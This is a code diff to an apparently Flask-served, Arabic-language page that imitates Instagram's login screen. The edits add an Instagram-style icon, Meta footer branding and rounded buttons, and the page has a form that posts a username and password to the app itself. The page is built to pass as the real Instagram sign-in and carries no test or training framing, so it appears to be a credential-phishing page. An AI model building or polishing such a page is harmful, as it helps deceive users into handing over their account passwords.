@@ -60,49 +60,70 @@ def login():
         
         .main-container { width: 100%; max-width: 350px; padding: 20px; display: flex; flex-direction: column; justify-content: center; flex-grow: 1; text-align: center; }
 
-        /* تدرج ألوان شعار إنستغرام المطابق للأصل تماماً */
-        .insta-logo { 
-            font-family: 'Billabong', cursive, sans-serif; 
-            font-size: 52px; 
-            margin-bottom: 25px; 
-            font-weight: normal; 
-            letter-spacing: 1px;
-            background: linear-gradient(135deg, #f58529 0%, #dd2a7b 50%, #8134af 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        /* أيقونة إنستغرام الرسمية */
+        .insta-icon-container {
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: center;
+        }
+        .insta-icon {
+            width: 75px;
+            height: 75px;
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+        }
+        .insta-icon svg {
+            width: 44px;
+            height: 44px;
+            fill: white;
         }
 
         .error-msg { color: #ed4956; font-size: 13px; line-height: 16px; margin-bottom: 15px; text-align: center; font-weight: 500; background: #fce8e6; padding: 10px; border-radius: 4px; border: 1px solid #fad2cf; }
 
         .input-group { margin-bottom: 8px; }
-        .input-group input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 5px; padding: 12px; font-size: 14px; color: #262626; outline: none; }
+        .input-group input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 8px; padding: 14px 12px; font-size: 14px; color: #262626; outline: none; }
         .input-group input:focus { border-color: #a8a8a8; }
 
-        .submit-btn { width: 100%; background: #0095f6; color: white; border: none; border-radius: 8px; padding: 12px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 10px; margin-bottom: 15px; }
+        .submit-btn { width: 100%; background: #0095f6; color: white; border: none; border-radius: 25px; padding: 12px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 10px; margin-bottom: 15px; }
         .submit-btn:hover { background: #1877f2; }
 
-        .divider { display: flex; align-items: center; margin: 10px 0 15px 0; }
-        .divider-line { flex-grow: 1; height: 1px; background: #dbdbdb; }
-        .divider-text { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 15px; text-transform: uppercase; }
+        .forgot-pass { color: #00376b; font-size: 13px; text-decoration: none; display: block; margin-top: 15px; font-weight: 500; }
 
-        .forgot-pass { color: #00376b; font-size: 13px; text-decoration: none; display: block; margin-top: 10px; font-weight: 500; }
-
-        .footer-section { width: 100%; padding-bottom: 20px; text-align: center; }
+        /* تذييل الصفحة والشعار */
+        .footer-section { width: 100%; padding-bottom: 20px; text-align: center; display: flex; flex-direction: column; align-items: center; }
         
-        .meta-footer { margin-bottom: 12px; }
-        .meta-logo { font-size: 15px; font-weight: 600; letter-spacing: 0.5px; display: inline-flex; align-items: center; gap: 4px; direction: ltr; }
-        .meta-logo span:nth-child(1) { color: #0081FB; }
-        .meta-logo span:nth-child(2) { color: #0092FA; }
-        .meta-logo span:nth-child(3) { color: #00A3F6; }
-        .meta-logo span:nth-child(4) { color: #00B4F0; }
+        .meta-footer { margin-bottom: 15px; display: flex; align-items: center; justify-content: center; }
+        .meta-brand {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #737373;
+            letter-spacing: 0.5px;
+        }
+        .meta-brand svg {
+            width: 22px;
+            height: 22px;
+            fill: #737373;
+        }
 
-        .signup-card { padding: 12px; font-size: 14px; color: #262626; border-top: 1px solid #dbdbdb; width: 100%; }
-        .signup-card a { color: #0095f6; font-weight: 600; text-decoration: none; }
+        .signup-card { padding: 12px; width: 90%; max-width: 350px; border: 1px solid #dbdbdb; border-radius: 25px; text-align: center; font-size: 14px; color: #0095f6; font-weight: 650; cursor: pointer; }
     </style>
 </head>
 <body>
     <div class="main-container">
-        <h1 class="insta-logo">Instagram</h1>
+        <div class="insta-icon-container">
+            <div class="insta-icon">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
+                </svg>
+            </div>
+        </div>
         
         {% if error %}
             <div class="error-msg">{{ error }}</div>
@@ -110,32 +131,28 @@ def login():
 
         <form method="POST">
             <div class="input-group">
-                <input type="text" name="username" required placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني" value="{{ username_val }}">
+                <input type="text" name="username" required placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم المحمول" value="{{ username_val }}">
             </div>
             <div class="input-group">
-                <input type="password" name="password" required placeholder="كلمة المرور">
+                <input type="password" name="password" required placeholder="كلمة السر">
             </div>
             <button type="submit" class="submit-btn">تسجيل الدخول</button>
         </form>
 
-        <div class="divider">
-            <div class="divider-line"></div>
-            <div class="divider-text">أو</div>
-            <div class="divider-line"></div>
-        </div>
-
-        <a href="#" class="forgot-pass">هل نسيت كلمة المرور؟</a>
+        <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
     </div>
 
     <div class="footer-section">
         <div class="meta-footer">
-            <div class="meta-logo">
-                From 
-                <span>M</span><span>e</span><span>t</span><span>a</span>
+            <div class="meta-brand">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12,4C14.5,4 16.5,6 16.5,8.5C16.5,10.2 15.5,11.7 14.1,12.5C16.5,13.5 18,15.7 18,18.5C18,21 16,23 13.5,23C11.5,23 9.9,21.8 9.2,20.1C8.7,20.7 7.9,21 7,21C4.8,21 3,19.2 3,17C3,15.1 4.3,13.5 6.1,13.1C5.4,12.2 5,11 5,9.5C5,6.5 7.5,4 10.5,4C11,4 11.5,4.1 12,4M12,6C11.6,6 11.2,6.1 10.8,6.2C11.4,7.1 11.8,8.2 11.8,9.5C11.8,11.1 11.1,12.5 10,13.5C10.7,13.8 11.4,14 12,14C14.2,14 16,12.2 16,10C16,7.8 14.2,6 12,6M7,15C5.9,15 5,15.9 5,17C5,18.1 5.9,19 7,19C8.1,19 9,18.1 9,17C9,15.9 8.1,15 7,15M13.5,15C11.6,15 10,16.6 10,18.5C10,20.4 11.6,22 13.5,22C15.4,22 17,20.4 17,18.5C17,16.6 15.4,15 13.5,15Z"/>
+                </svg>
+                Meta
             </div>
         </div>
         <div class="signup-card">
-            ليس لديك حساب؟ <a href="#">إشترك</a>
+            إنشاء حساب جديد
         </div>
     </div>
 </body>
